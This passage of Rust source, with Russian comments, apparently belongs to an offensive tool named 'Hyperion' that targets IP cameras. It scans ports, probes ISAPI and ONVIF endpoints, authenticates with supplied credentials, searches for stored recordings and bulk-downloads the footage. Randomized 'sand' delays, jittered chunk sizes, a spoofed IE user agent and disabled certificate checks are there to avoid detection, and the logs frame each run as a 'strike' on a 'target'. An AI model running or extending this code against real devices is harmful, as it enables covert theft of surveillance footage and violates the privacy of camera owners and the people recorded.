        .danger_accept_invalid_certs(true)
        .user_agent(&session_ua)
        .build().map_err(|e| e.to_string())?;

    let path = url_to_path(playback_uri);

    // Шаг 1: Digest-авторизованный HEAD для определения размера
    let head_resp = digest_download_request(
        &client, playback_uri, &path, login, pass, vec![], tx,
    ).await;

    // Определяем стратегию по ответу HEAD
    let total_size = match head_resp {
        Ok(r) if r.status().is_success() => r.content_length().unwrap_or(0),
        Ok(r) if r.status().as_u16() == 401 => {
            return Err(format!("AUTH FAILED: HTTP 401 на {}", playback_uri));
        }
        _ => 0,
    };

    // Подготовка файла
    let dir = get_vault_path().join("archives").join("nexus_isapi");
    let _ = std::fs::create_dir_all(&dir);
    let mut filename = sanitize_filename(filename_hint);
    if filename.is_empty() { filename = format!("isapi_{}.mp4", Utc::now().timestamp()); }
    if !filename.contains('.') { filename.push_str(".mp4"); }
    let fpath = dir.join(&filename);

    if total_size == 0 {
        let _ = tx.send(HyperionEvent::NexusLog {
            message: "⚠️ [SAND] Размер неизвестен, fallback на stream".into(),
        }).await;
        return sand_download_isapi_stream(
            &client, playback_uri, &path, login, pass,
            &filename, &fpath, &task_key, tx,
        ).await;
    }

    // Шаг 2: CHUNK JITTER с Digest auth на каждый чанк
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] Размер: {:.1} MB. Chunked Digest download.", total_size as f64 / 1_048_576.0),
    }).await;

    let mut file = std::fs::OpenOptions::new().create(true).write(true).truncate(true)
        .open(&fpath).map_err(|e| e.to_string())?;

    let mut current: u64 = 0;
    let mut chunk_n = 0u32;
    let started = Instant::now();

    while current < total_size {
        let chunk_sz = rng.range(sand.chunk_min, sand.chunk_max);
        let end = (current + chunk_sz - 1).min(total_size - 1);
        let range_hdr = format!("bytes={}-{}", current, end);

        let resp = digest_download_request(
            &client, playback_uri, &path, login, pass,
            vec![("Range", range_hdr.clone())], tx,
        ).await?;

        let status = resp.status().as_u16();
        if status != 206 && status != 200 {
            if chunk_n == 0 {
                // Range не поддерживается — потоковый fallback
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("⚠️ [SAND] Range unsupported (HTTP {}), stream fallback", status),
                }).await;
                drop(file);
                let _ = std::fs::remove_file(&fpath);
                return sand_download_isapi_stream(
                    &client, playback_uri, &path, login, pass,
                    &filename, &fpath, &task_key, tx,
                ).await;
            }
            return Err(format!("chunk #{} HTTP {}", chunk_n, status));
        }

        let data = resp.bytes().await.map_err(|e| e.to_string())?;
        let got = data.len() as u64;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        current += got;
        chunk_n += 1;

        let _chunk_ms = started.elapsed().as_millis() as u64;

        if chunk_n % 4 == 0 || current >= total_size {
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("🏖️ [SAND] #{} | {:.1}/{:.1}MB ({:.0}%) | range={}",
                    chunk_n, current as f64 / 1_048_576.0, total_size as f64 / 1_048_576.0,
                    (current as f64 / total_size as f64) * 100.0, range_hdr),
            }).await;
        }
        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("DOWNLOAD_PROGRESS|{}|{}|{}", task_key, current, total_size),
        }).await;

        if current < total_size {
            let pause = rng.range(sand.delay_min_ms, sand.delay_max_ms);
            tokio::time::sleep(Duration::from_millis(pause)).await;
        }
    }

    let elapsed = started.elapsed();
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] DONE: {} | {} chunks | {:.1}MB | {:.1}s",
            filename, chunk_n, current as f64 / 1_048_576.0, elapsed.as_secs_f64()),
    }).await;
    Ok(fpath.to_string_lossy().to_string())
}


/// ONVIF скачивание: Digest на API-фазе, ffmpeg на RTSP-фазе
async fn sand_download_onvif(
    endpoint: &str, token: &str, login: &str, pass: &str,
    filename_hint: &str, tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let is_2019 = endpoint.contains(":2019");
    let client = if is_2019 { build_ie_client(45)? } else { build_sand_client(&mut rng, 45)? };
    let task_key = format!("nexus_onvif_{}", Utc::now().timestamp_millis());

    sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "pre-GetReplayUri").await;

    let soap = format!(r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema">
  <s:Body><trp:GetReplayUri>
    <trp:StreamSetup><tt:Stream>RTP-Unicast</tt:Stream><tt:Transport><tt:Protocol>RTSP</tt:Protocol></tt:Transport></trp:StreamSetup>
    <trp:RecordingToken>{}</trp:RecordingToken>
  </trp:GetReplayUri></s:Body>
</s:Envelope>"#, token);

    let path = url_to_path(endpoint);
    let resp = digest_request(&client, reqwest::Method::POST, endpoint, &path, login, pass, Some(soap), tx).await?;
    let body = resp.text().await.map_err(|e| e.to_string())?;
    let uri_re = Regex::new(r"<[^>]*Uri[^>]*>([^<]+)</[^>]+>").map_err(|e| e.to_string())?;
    let replay_uri = uri_re.captures(&body)
        .and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string()))
        .ok_or("ONVIF replay URI не найден")?;

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] ONVIF replay: {}", replay_uri),
    }).await;

    sand_sleep(&mut rng, 500, 1500, tx, "pre-ffmpeg").await;

    let dir = get_vault_path().join("archives").join("nexus_onvif");
    let _ = std::fs::create_dir_all(&dir);
    let mut filename = sanitize_filename(filename_hint);
    if filename.is_empty() { filename = format!("onvif_{}.mp4", Utc::now().timestamp()); }
    if !filename.contains('.') { filename.push_str(".mp4"); }
    let fpath = dir.join(&filename);
    let ffmpeg = get_vault_path().join("ffmpeg.exe");

    let mut child = std::process::Command::new(&ffmpeg)
        .args(["-y", "-rtsp_transport", "tcp", "-i", &replay_uri, "-t", "120", "-c", "copy", &fpath.to_string_lossy()])
        .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::piped())
        .spawn().map_err(|e| format!("ffmpeg: {}", e))?;

    let started = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(s)) => { if !s.success() { return Err("ffmpeg error".into()); } break; }
            Ok(None) => {
                if started.elapsed() > Duration::from_secs(180) { let _ = child.kill(); return Err("ffmpeg timeout".into()); }
                tokio::time::sleep(Duration::from_secs(2)).await;
                if let Ok(m) = std::fs::metadata(&fpath) {
                    if m.len() > 0 { let _ = tx.send(HyperionEvent::NexusLog { message: format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, m.len()) }).await; }
                }
            }
            Err(e) => return Err(format!("ffmpeg: {}", e)),
        }
    }
    let sz = std::fs::metadata(&fpath).map(|m| m.len()).unwrap_or(0);
    let _ = tx.send(HyperionEvent::NexusLog { message: format!("🏖️ [SAND] ONVIF done: {} ({} bytes)", filename, sz) }).await;
    Ok(fpath.to_string_lossy().to_string())
}


// =============================================================================
// 5. ОРКЕСТРАТОР
// =============================================================================

pub struct HyperionMaster {
    pub tx: mpsc::Sender<HyperionEvent>,
}

impl HyperionMaster {
    pub fn boot_with_log_bridge() -> (Self, mpsc::Receiver<String>) {
        println!("===================================================");
        println!("🚀 [HYPERION] Digest + Sand + IE Masking Engine");
        println!("===================================================");

        let (tx, mut rx) = mpsc::channel::<HyperionEvent>(1000);
        let (log_tx, log_rx) = mpsc::channel::<String>(500);
        let tx_internal = tx.clone();

        tokio::spawn(async move {
            while let Some(event) = rx.recv().await {
                if let HyperionEvent::NexusLog { ref message } = event {
                    let _ = log_tx.send(message.clone()).await;
                    continue;
                }

                let summary = match &event {
                    HyperionEvent::TargetDiscovered { ip, port, .. } => Some(format!("☢️ [NEXUS] Цель: {}:{}", ip, port)),
                    HyperionEvent::AnalyzeTarget { ip, .. } => Some(format!("🧠 [BRAIN] Анализ {}", ip)),
                    HyperionEvent::TargetAnalyzed { ip, vendor, device_model, camera_time_offset, .. } =>
                        Some(format!("⚖️ [VERDICT] {}: {} ({}) clock_skew={:?}",
                            ip, vendor, device_model.as_deref().unwrap_or("?"), camera_time_offset)),
                    HyperionEvent::ExecuteStrike { ip, vendor, .. } => Some(format!("🥷 [SPETSNAZ] Штурм {} ({})", ip, vendor)),
                    HyperionEvent::ExtractIntel { ip, isapi_recordings, onvif_recordings, .. } =>
                        Some(format!("🔑 [CIPHER] ISAPI:{} ONVIF:{} для {}", isapi_recordings.len(), onvif_recordings.len(), ip)),
                    HyperionEvent::TransportCargo { ip, download_tasks, .. } =>
                        Some(format!("🚚 [TRANSPORT] {} задач для {}", download_tasks.len(), ip)),
                    HyperionEvent::OperationComplete { ip, result } => Some(format!("✅ [COMPLETE] {} : {}", ip, result)),
                    HyperionEvent::OperationFailed { ip, reason } => Some(format!("❌ [FAILED] {} : {}", ip, reason)),
                    _ => None,
                };
                if let Some(msg) = summary { let _ = log_tx.send(msg).await; }

                match event {
                    HyperionEvent::TargetDiscovered { ip, port, login, pass } => {
                        let _ = tx_internal.send(HyperionEvent::AnalyzeTarget { ip, port, login, pass }).await;
                    }

                    HyperionEvent::AnalyzeTarget { ip, port, login, pass } => {
                        let tx_b = tx_internal.clone();
                        tokio::spawn(async move {
                            let host = normalize_host(&ip);
                            if host.is_empty() {
                                let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "Пустой хост".into() }).await;
                                return;
                            }
                            let mut rng = SandRng::new();

                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 Порты {}...", host) }).await;
                            let open_ports = scan_ports(&host, &tx_b).await;
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 Открыты: {:?}", open_ports) }).await;
                            if open_ports.is_empty() {
                                let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "Все порты закрыты".into() }).await;
                                return;
                            }

                            sand_sleep(&mut rng, 300, 800, &tx_b, "inter-phase").await;

                            let _ = tx_b.send(HyperionEvent::NexusLog { message: "🧠 ISAPI/ONVIF probe...".into() }).await;
                            let (isapi_ep, onvif_ep) = tokio::join!(
                                probe_isapi(&host, &login, &pass, &tx_b),
                                probe_onvif(&host, &tx_b)
                            );
                            let _ = tx_b.send(HyperionEvent::NexusLog {
                                message: format!("🧠 ISAPI: {} | ONVIF: {}",
                                    isapi_ep.as_deref().unwrap_or("—"), onvif_ep.as_deref().unwrap_or("—")),
                            }).await;

                            if isapi_ep.is_none() && onvif_ep.is_none() {
                                let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "ISAPI/ONVIF не найдены".into() }).await;
                                return;
                            }

                            sand_sleep(&mut rng, 200, 600, &tx_b, "pre-vendor").await;

                            let _ = tx_b.send(HyperionEvent::NexusLog { message: "🧠 Вендор + часы камеры...".into() }).await;
                            let (vendor, model, clock_offset) = fetch_device_info(&host, &login, &pass, &tx_b).await;
                            let _ = tx_b.send(HyperionEvent::NexusLog {
                                message: format!("🧠 {} | {} | clock={:?}", vendor, model.as_deref().unwrap_or("n/a"), clock_offset),
                            }).await;

                            let _ = tx_b.send(HyperionEvent::TargetAnalyzed {
                                ip, port, login, pass, vendor, open_ports,
                                isapi_endpoint: isapi_ep, onvif_endpoint: onvif_ep,
                                device_model: model, camera_time_offset: clock_offset,
                            }).await;
                        });
                    }

                    HyperionEvent::TargetAnalyzed { ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset, .. } => {
                        if isapi_endpoint.is_some() || onvif_endpoint.is_some() {
                            let _ = tx_internal.send(HyperionEvent::ExecuteStrike {
                                ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset,
                            }).await;
                        } else {
                            let _ = tx_internal.send(HyperionEvent::OperationFailed { ip, reason: "Нет протоколов".into() }).await;
                        }
                    }

                    HyperionEvent::ExecuteStrike { ip, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset, .. } => {
                        let tx_s = tx_internal.clone();
                        tokio::spawn(async move {
                            let host = normalize_host(&ip);
                            let mut rng = SandRng::new();
                            sand_sleep(&mut rng, 500, 1500, &tx_s, "pre-strike").await;

                            let (ih, oh) = tokio::join!(
                                async {
                                    if isapi_endpoint.is_some() {
                                        search_isapi(&host, &login, &pass, camera_time_offset, &tx_s).await
                                    } else { vec![] }
                                },
                                async {
                                    if onvif_endpoint.is_some() {
                                        search_onvif(&host, &login, &pass, &tx_s).await
                                    } else { vec![] }
                                }
                            );

                            let _ = tx_s.send(HyperionEvent::NexusLog {
                                message: format!("🥷 Итог: ISAPI={}, ONVIF={}", ih.len(), oh.len()),
                            }).await;

                            if ih.is_empty() && oh.is_empty() {
                                let _ = tx_s.send(HyperionEvent::OperationFailed { ip, reason: "Записи не найдены (все TrackID пусты)".into() }).await;
                                return;
                            }
                            let _ = tx_s.send(HyperionEvent::ExtractIntel {
                                ip, login, pass, vendor, isapi_recordings: ih, onvif_recordings: oh,
                            }).await;
                        });
                    }

                    HyperionEvent::ExtractIntel { ip, login, pass, isapi_recordings, onvif_recordings, .. } => {
                        let mut tasks: Vec<DownloadTask> = Vec::new();
                        for (i, hit) in isapi_recordings.iter().enumerate() {
                            if let Some(ref uri) = hit.playback_uri {
                                tasks.push(DownloadTask::IsapiPlayback {
                                    playback_uri: uri.clone(), login: login.clone(), pass: pass.clone(),
                                    filename_hint: format!("isapi_{}_{}_{}.mp4",
                                        normalize_host(&ip), hit.track_id.as_deref().unwrap_or("trk"), i),
                                });
                            }
                        }
                        for (i, hit) in onvif_recordings.iter().enumerate() {
                            tasks.push(DownloadTask::OnvifToken {
                                endpoint: hit.endpoint.replace("recording_service", "replay_service"),
                                recording_token: hit.token.clone(), login: login.clone(), pass: pass.clone(),
                                filename_hint: format!("onvif_{}_{}.mp4", normalize_host(&ip), i),
                            });
                        }

                        let _ = tx_internal.send(HyperionEvent::NexusLog {
                            message: format!("🔑 {} задач для {}", tasks.len(), ip),
                        }).await;

                        if tasks.is_empty() {
                            let _ = tx_internal.send(HyperionEvent::OperationComplete {
                                ip, result: "Записи есть, но URI отсутствуют".into(),
                            }).await;
                        } else {
                            let _ = tx_internal.send(HyperionEvent::TransportCargo { ip, login, pass, download_tasks: tasks }).await;
                        }
                    }

                    HyperionEvent::TransportCargo { ip, download_tasks, .. } => {
                        let tx_t = tx_internal.clone();
                        tokio::spawn(async move {
                            let total = download_tasks.len();
                            let mut ok = 0usize;
                            let mut fail = 0usize;
                            let mut rng = SandRng::new();
                            let sand = SandProfile::standard();

                            for (i, task) in download_tasks.into_iter().enumerate() {
                                if i > 0 {
                                    sand_sleep(&mut rng, sand.task_delay_min_ms, sand.task_delay_max_ms,
                                        &tx_t, &format!("inter-task {}/{}", i+1, total)).await;
                                }
                                let _ = tx_t.send(HyperionEvent::NexusLog {
                                    message: format!("🚚 Задача {}/{} для {}", i+1, total, ip),
                                }).await;

                                let res = match task {
                                    DownloadTask::IsapiPlayback { playback_uri, login, pass, filename_hint } =>
                                        sand_download_isapi(&playback_uri, &login, &pass, &filename_hint, &tx_t).await,
                                    DownloadTask::OnvifToken { endpoint, recording_token, login, pass, filename_hint } =>
                                        sand_download_onvif(&endpoint, &recording_token, &login, &pass, &filename_hint, &tx_t).await,
                                    DownloadTask::RtspCapture { source_url, filename_hint, duration_seconds } => {
                                        let dir = get_vault_path().join("archives").join("nexus_rtsp");
                                        let _ = std::fs::create_dir_all(&dir);
                                        let p = dir.join(&filename_hint);
                                        match std::process::Command::new(get_vault_path().join("ffmpeg.exe"))
                                            .args(["-y", "-rtsp_transport", "tcp", "-i", &source_url,
                                                   "-t", &duration_seconds.to_string(), "-c", "copy", &p.to_string_lossy()])
                                            .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).spawn()
                                        {
                                            Ok(mut c) => match c.wait() {
                                                Ok(s) if s.success() => Ok(p.to_string_lossy().to_string()),
                                                _ => Err("ffmpeg failed".into()),
                                            },
                                            Err(e) => Err(format!("ffmpeg: {}", e)),
                                        }
                                    }
                                };
                                match res {
                                    Ok(_) => ok += 1,
                                    Err(e) => { fail += 1; let _ = tx_t.send(HyperionEvent::NexusLog { message: format!("🚚 ОШИБКА: {}", e) }).await; }
                                }
                            }
                            let _ = tx_t.send(HyperionEvent::OperationComplete {
                                ip, result: format!("{}/{} загружено, {} ошибок", ok, total, fail),
                            }).await;
                        });
                    }

                    HyperionEvent::OperationComplete { .. } | HyperionEvent::OperationFailed { .. } => {}
                    HyperionEvent::NexusLog { .. } => {}
                }
            }
        });

        (Self { tx }, log_rx)
    }
}
